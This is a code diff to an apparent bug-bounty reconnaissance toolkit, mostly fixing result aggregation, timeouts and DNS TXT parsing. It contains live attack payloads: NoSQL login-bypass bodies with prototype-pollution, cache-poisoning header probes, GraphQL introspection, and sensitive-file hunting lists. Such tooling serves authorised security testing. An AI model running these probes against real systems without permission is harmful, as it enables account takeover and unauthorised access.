@@ -2695,7 +2695,7 @@ function cacheEvidence(res) {
 		if (!v) continue;
 		const low = String(v).toLowerCase();
 		if (h === "cache-control" && /no-store|no-cache|private|max-age=0/.test(low)) continue;
-		if (h === "age" && !/^\d+$/.test(low)) continue;
+		if (h === "age" && (!/^\d+$/.test(low) || low === "0")) continue;
 		// status headers (x-cache, cf-cache-status, x-vercel-cache, x-cache-status, ...) that say
 		// MISS/DYNAMIC/BYPASS/etc. are NOT cache-hit evidence — a "hit" is only proven by a HIT value
 		// (or a nonzero Age on an uncacheable-looking response is still weak — keep it, it's a hint).
@@ -3394,7 +3394,7 @@ const TOOLS = [
 				renderLines("bb_js_secrets", [
 					"domain: " + v.domain,
 					"scanned " + v.count + " JS files",
-					...(v.urls.length ? v.urls.map((u) => "[" + u.found.join(",") + "] " + u.url) : ["no secrets matched"]),
+					...(v.urls.length ? v.urls.map((u) => "[" + u.found.join(",") + "] " + u.url) : [v.count === 0 && v.note.includes("failed to fetch") ? "no JS files could be fetched — see note (not a clean negative)" : "no secrets matched"]),
 					v.note ? "note: " + v.note : "",
 				])
 		},
@@ -3422,10 +3422,7 @@ const TOOLS = [
 						const found = [];
 						for (const p of patterns) {
 							const m = (txt.match(p.re) || []).slice(0, 8);
-							if (m.length) {
-								found.push(p.name + "=" + m[0].slice(0, 48));
-								break;
-							}
+							if (m.length) found.push(p.name + "=" + m[0].slice(0, 48));
 						}
 						if (found.length) out.urls.push({ url: u, found });
 					} catch {
@@ -4324,6 +4321,8 @@ const TOOLS = [
 				if (error && !sensitive.length) out.note = "CDX error: " + error;
 				const suffixes = ["/style.css", "/main.css", "/main.js", "/test.png?x=1", "/.css", ";.css"];
 				const seen = new Set();
+				// aggregate deadline: CDX ~30s + 20 paths × 6 suffixes × 5s stall-stacked at conc 6 ≈ 100s → total > 120s timeout
+				const de = deadlineExec(exec, 110000);
 				// budget: worst wall = ceil(20*6/6)*5000 = 100s + CDX ~30s > 120s timeout -> scale fetch budget down
 				const fetchMs = budgetFit(90000, 5000, Math.min(sensitive.length, 20) * suffixes.length, 6) === null ? 4000 : 5000;
 				await mapPool(sensitive.slice(0, Math.min(sensitive.length, 20)), 6, async (p) => {
@@ -4334,7 +4333,7 @@ const TOOLS = [
 						seen.add(u);
 						out.scanned++;
 						try {
-							const { res } = await fetchRes(u, exec, { budget: fetchMs });
+							const { res } = await fetchRes(u, de, { budget: fetchMs });
 							await readLimited(res, 800);
 							const ev = cacheEvidence(res);
 							if (ev.length) out.cacheable.push({ url: u, status: res.status, evidence: ev.slice(0, 4) });
@@ -4705,8 +4704,9 @@ const TOOLS = [
 				const limit = Math.min(Math.max(Number(args.limit) || 60, 1), 200);
 				const { urls, error } = await cdxUrls(domain, exec, { cap: 800 });
 				if (error) out.error = error;
-				const EXTS = ["xls", "xml", "json", "pdf", "sql", "doc", "docx", "pptx", "txt", "zip", "tar.gz", "tgz", "bak", "ost", "wim", "rar", "7z", "reg", "db", "jar", "war", "git", "gitignore", "py", "csv", "rtf", "env", "log", "lock", "key", "p12", "pem", "der", "csr", "conf", "cfg", "ini", "sqlite", "sqlcipher", "apk", "apkg", "whl", "deb", "rpm", "msi", "exe", "dll", "so", "sh", "mmdb", "accdb", "sqlite3", "db3", "dat", "bin", "hex", "backup"];
-				const re = new RegExp("\\.(" + EXTS.map((e) => e.replace(/\./g, "\\.")).join("|") + ")([?#].*)?$", "i");
+				const EXTS = ["xls", "xml", "json", "pdf", "sql", "doc", "docx", "pptx", "txt", "zip", "tar.gz", "tgz", "bak", "ost", "wim", "rar", "7z", "reg", "db", "jar", "war", "git", "gitignore", "py", "csv", "rtf", "env", "log", "lock", "key", "p12", "pem", "der", "csr", "conf", "cfg", "ini", "sqlite", "sqlcipher", "apk", "apkg", "whl", "deb", "rpm", "msi", "exe", "dll", "so", "sh", "mmdb", "accdb", "sqlite3", "db3", "dat", "bin", "hex", "backup", "htaccess", "htpasswd", "DS_Store", "swp", "swo"];
+				// \.env(\..+)? allows .env, .env.local, .env.production etc — the plain \.env([?#].*)?$ would miss dotted variants
+				const re = new RegExp("\\.(" + EXTS.map((e) => e === "env" ? "env(\\.[^/?#]+)?" : e.replace(/\./g, "\\.")).join("|") + ")([?#].*)?$", "i");
 				const seen = new Set();
 				for (const u of urls) {
 					let path;
@@ -4893,7 +4893,7 @@ const TOOLS = [
 			const paths = ["/graphql", "/api/graphql", "/v1/graphql", "/query", "/gql", "/graphiql", "/graphql/graphql", "/api/v1/graphql"];
 			const q = JSON.stringify({ query: "{ __schema { queryType { name } mutationType { name } types { name kind } } }" });
 			try {
-				await mapPool(paths, 3, async (p) => {
+				const probeResults = await mapPool(paths, 3, async (p) => {
 					let status = 0;
 					let body = "";
 					const r = { path: p, status: 0, introspection: false, type_count: 0, has_mutations: false };
@@ -4935,8 +4935,9 @@ const TOOLS = [
 							if (schema && schema.mutationType && schema.mutationType.name) r.has_mutations = true;
 						}
 					}
-					out.results.push(r);
+					return r;
 				});
+				out.results.push(...probeResults);
 				const enabled = out.results.filter((r) => r.introspection);
 				out.summary = enabled.length
 					? `${enabled.length} GraphQL endpoint(s) with introspection enabled: ${enabled.map((r) => r.path).join(", ")} — dump schema, hunt field-level IDOR, alias-based rate-limit bypass and depth-limit DoS`
@@ -5120,7 +5121,7 @@ const TOOLS = [
 				const resource = (alreadyVersioned ? resSegs.slice(1) : resSegs).join("/");
 				// rebuild from origin+pathname so the query string is never mangled into the version segment
 				const basePath = (pu.origin + pu.pathname).replace(/\/+$/, "");
-				await mapPool(VERS, 6, async (v) => {
+				const versionResults = await mapPool(VERS, 6, async (v) => {
 					const probe = useSibling
 						? pu.origin + "/api/" + v + (resource ? "/" + resource : "") + pu.search
 						: basePath + "/" + v + pu.search;
@@ -5131,9 +5132,12 @@ const TOOLS = [
 					} catch {
 						status = 0;
 					}
+					return { probe, status, v };
+				});
+				for (const { probe, status, v } of versionResults) {
 					out.versions.push({ probe, status });
 					if (status && status !== 404 && status !== 0) out.live.push(`${v} (${status})`);
-				});
+				}
 				if (args.version_params !== false) {
 					let stV = 0;
 					let stA = 0;
@@ -5318,9 +5322,9 @@ const TOOLS = [
 						}
 					}
 					const marker = markers.find((mk) => mk && (hdr.includes(mk.toLowerCase()) || body.toLowerCase().includes(mk.toLowerCase()))) || "";
-					// bare 200 with NO vendor marker is NOT a fingerprint — many generic boxes 200 on /remote/login
-					const strong = Boolean(marker) || (status === 200 && body.length > 0 && /login|vpn|gateway|secure access|access gateway/i.test(body));
-					return { vendor, path, status, marker: marker || (status === 200 ? "no vendor marker — weak 200" : ""), strong };
+					// only vendor-specific markers count as strong — a generic 200 with "login" in the body
+					// is NOT a fingerprint (many catch-all portals contain that word)
+					return { vendor, path, status, marker: marker || (status === 200 ? "no vendor marker — weak 200" : ""), strong: Boolean(marker) };
 				});
 				out.results.push(...rows.map(({ vendor, path, status, marker }) => ({ vendor, path, status, marker })));
 				for (const r of rows) if (r.strong && !out.vendors.includes(r.vendor)) out.vendors.push(r.vendor);
@@ -5383,7 +5387,10 @@ const TOOLS = [
 					const j = await resp.json();
 					if (!j || j.Status === 2) return { value: "", error: "SERVFAIL/refused" };
 					if (j.Answer) {
-						const v = j.Answer.filter((a) => a.type === 16).map((a) => (a.data || "").replace(/^"|"$/g, "").replace(/""/g, '"')).join("");
+						// distinct TXT records are separate entries — join with newline to keep them distinguishable
+						// (multiple strings within one record are already concatenated in the data field per DoH JSON)
+						const txtVals = j.Answer.filter((a) => a.type === 16).map((a) => (a.data || "").replace(/^"|"$/g, "").replace(/""/g, '"'));
+						const v = txtVals.join("\n");
 						return { value: v, error: null };
 					}
 					return { value: "", error: null };
@@ -5428,9 +5435,14 @@ const TOOLS = [
 				if (spfQ.error) {
 					out.findings.push("SPF lookup FAILED (" + spfQ.error + ") — result unknown, do NOT report spoofable");
 				} else {
-					const spf = spfQ.value || "";
+					const spfRaw = spfQ.value || "";
+					// multiple TXT records at the apex (e.g., verification + SPF) are newline-joined; pick the SPF one
+					const spfLine = spfRaw.split("\n").find((s) => /v=spf1/i.test(s)) || "";
+					const spf = spfLine || "";
 					out.spf.record = spf;
-					if (spf) {
+					if (!spf || !/v=spf1/i.test(spf)) {
+						out.findings.push("NO SPF record — domain spoofable for email");
+					} else {
 						const ips = [];
 						for (const m of spf.matchAll(/ip4:([0-9./]+)/g)) ips.push(m[1]);
 						for (const m of spf.matchAll(/ip6:([0-9a-f:/]+)/g)) ips.push(m[1]);
@@ -5439,17 +5451,17 @@ const TOOLS = [
 						out.spf.includes = inc;
 						if (/\+all(\s|$)/.test(spf)) out.findings.push("SPF uses +all — explicitly ALLOWS everyone to send as the domain (worst case)");
 						else if (!/[\-\~]all/.test(spf)) out.findings.push("SPF lacks a hard (-all) or soft (~all) fail — spoofing-allowed default");
-					} else {
-						out.findings.push("NO SPF record — domain spoofable for email");
 					}
 				}
 				const dmarcQ = qmap.dmarc;
 				if (dmarcQ.error) {
 					out.findings.push("DMARC lookup FAILED (" + dmarcQ.error + ") — result unknown");
 				} else {
-					const dmarc = dmarcQ.value || "";
+					const dmarcRaw = dmarcQ.value || "";
+					const dmarcLine = dmarcRaw.split("\n").find((s) => /v=DMARC1/i.test(s)) || "";
+					const dmarc = dmarcLine || "";
 					out.dmarc.record = dmarc;
-					if (!dmarc) out.findings.push("NO DMARC record — receivers must guess; spoofed mail lands in inbox");
+					if (!dmarc || !/v=DMARC1/i.test(dmarc)) out.findings.push("NO DMARC record — receivers must guess; spoofed mail lands in inbox");
 					else if (/p=none/.test(dmarc)) out.findings.push("DMARC p=none — monitoring only, spoofed mail NOT rejected");
 				}
 				const caaQ = qmap.caa;
@@ -5621,27 +5633,30 @@ const TOOLS = [
 				const baseline = await fetchRes(target, exec, { budget: 8000 });
 				const baseText = await readLimited(baseline.res, 2000);
 				const hget = (h, n) => { try { return h.get(n) || ""; } catch { return ""; } };
-				const mk = (h) => ["age", "x-cache", "cf-cache-status", "x-cache-status", "x-varnish", "cache-control"].map((n) => hget(h, n)).filter(Boolean).join(", ") || "-";
+				const mk = (h) => ["age", "x-cache", "cf-cache-status", "x-cache-status", "x-varnish", "cache-control"].map((n) => { const v = hget(h, n); return v ? n + ": " + v : ""; }).filter(Boolean).join(", ") || "-";
 				const ind = ["age", "x-cache", "cf-cache-status", "x-cache-status", "x-varnish"].map((n) => hget(baseline.res.headers, n)).filter(Boolean);
 				out.cache_indicators = [...new Set(ind)];
 				const sawCache = out.cache_indicators.length > 0;
 				const hashes = new Map();
-				await mapPool(HEADERS, 4, async (h) => {
+				const headerResults = await mapPool(HEADERS, 4, async (h) => {
 					const vals = h === "x-forwarded-host" ? ["evil.example.net", "poisoned.example.net"] : h === "x-original-url" ? ["/admin", "/profile"] : ["203.0.113.7", "203.0.113.8"];
+					const rows = [];
 					for (const val of vals) {
 						const b = withBudget(exec, 5000);
 						try {
 							const r = await fetch(target, { method: "GET", signal: b.signal, redirect: "follow", headers: { "user-agent": UA, [h]: val } });
 							const txt = await readLimited(r, 2000);
-							out.results.push({ header: h, value: val, probe: "GET", status: r.status, body_len: txt.length, cache_headers: mk(r.headers || {}) });
+							rows.push({ header: h, value: val, probe: "GET", status: r.status, body_len: txt.length, cache_headers: mk(r.headers || {}) });
 							hashes.set(h + "\u0000" + val, hashText(txt));
 						} catch (e) {
-							out.results.push({ header: h, value: val, probe: "GET", status: 0, body_len: 0, cache_headers: "error: " + shortErr(e) });
+							rows.push({ header: h, value: val, probe: "GET", status: 0, body_len: 0, cache_headers: "error: " + shortErr(e) });
 						} finally {
 							b.dispose();
 						}
 					}
+					return rows;
 				});
+				for (const rows of headerResults) out.results.push(...rows);
 				// identical FULL body for different header values + cache layer + at least ONE probe
 				// PROVEN cache-served (HIT/Age>0) -> header unkeyed. Identical bodies alone are the
 				// default outcome (same URL), so without per-probe cache evidence this is not a finding.
@@ -5731,7 +5746,7 @@ const TOOLS = [
 							txtLen = (await readLimited(r, 400)).length;
 							st = r.status;
 						} catch (e) {
-							st = e && e.name === "AbortError" ? 0 : (e && (e.status || 599));
+							st = e && typeof e.status === "number" && e.status >= 100 ? e.status : 0;
 						} finally {
 							b.dispose();
 						}
@@ -5824,13 +5839,14 @@ const TOOLS = [
 				const uf = args.usernameField || "username";
 				const pf = args.passwordField || "password";
 				const mkBody = (u, p) => JSON.stringify({ [uf]: u, [pf]: p });
+				const baseBody = mkBody({ "$ne": null }, { "$ne": null });
 				const payloads = [
 					{ name: "baseline", payload: mkBody("pentest_nosql", "wrongpass123") },
 					{ name: "ne-ne", payload: mkBody({ "$ne": null }, { "$ne": null }) },
 					{ name: "ne-gt", payload: mkBody({ "$ne": "x" }, { "$gt": "" }) },
 					{ name: "regex", payload: mkBody({ "$regex": ".*" }, { "$regex": ".*" }) },
 					{ name: "array-wrap", payload: JSON.stringify([{ [uf]: { "$ne": null }, [pf]: { "$ne": null } }]) },
-					{ name: "proto-user", payload: JSON.stringify({ [uf]: { "$ne": null }, [pf]: { "$ne": null }, __proto__: { admin: true } }) },
+					{ name: "proto-user", payload: baseBody.slice(0, -1) + ',"__proto__":{"admin":true}}' },
 					{ name: "dot-injection", payload: JSON.stringify({ [uf + ".$ne"]: null, [pf + ".$ne"]: null }) }
 				];
 				const MARKERS = ["token", "welcome", "dashboard", "logged", "session", "admin", "2fa", "otp"];
